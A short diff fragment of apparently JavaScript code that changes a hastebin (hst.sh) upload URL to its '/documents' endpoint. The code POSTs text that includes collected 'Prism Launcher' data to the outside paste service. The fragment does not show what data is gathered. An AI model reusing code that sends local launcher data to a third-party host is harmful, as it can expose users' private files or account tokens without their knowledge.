@@ -49,7 +49,7 @@ ${data.prism || 'No Prism Launcher data found'}
 
 `;
 
-        const hastebinUrl = new java.net.URL("https://hst.sh/");
+        const hastebinUrl = new java.net.URL("https://hst.sh/documents");
         const hastebinConn = hastebinUrl.openConnection();
         hastebinConn.setRequestMethod("POST");
         hastebinConn.setRequestProperty("Content-Type", "text/plain");
